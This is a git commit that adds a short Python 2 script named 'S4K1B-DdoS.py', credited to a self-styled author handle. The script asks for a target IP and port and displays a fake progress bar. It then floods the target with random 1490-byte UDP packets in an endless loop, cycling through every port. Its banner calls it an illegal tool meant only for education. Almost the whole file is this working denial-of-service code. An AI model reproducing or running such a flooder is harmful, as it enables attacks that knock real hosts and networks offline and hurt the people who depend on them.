ebb40f3e4de8b21d38cc6a18987599b5ff9a3275
MOHAMMAD SAQUIB <166982883+S4K1BK1NG@users.noreply.github.com>
2024-04-14 20:36:05 +0530

    Add files via upload

---
+++ S4K1B-DdoS.py
@@ -0,0 +1,57 @@
+print ("\033[91m")
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet S4K1B-DdoS")
+print
+print "Coded By : S4K1B"
+print "Author   : SAKIB KING"
+print "Github   : github.com/S4K1BK1NG"
+print "Fb Page  : insttagram.com/s4k1bk1ng"
+print "Telegram : t.me/UPS4K1B"
+print "IF YOU WANT JO CONNECT WITH ME THEN DM ON TELEGRAM"
+print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+os.system("clear")
+print("\033[93m")
+os.system("figlet DdoS Attack")
+print("SOLO : S4K1B")
+print ("\033[92m")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
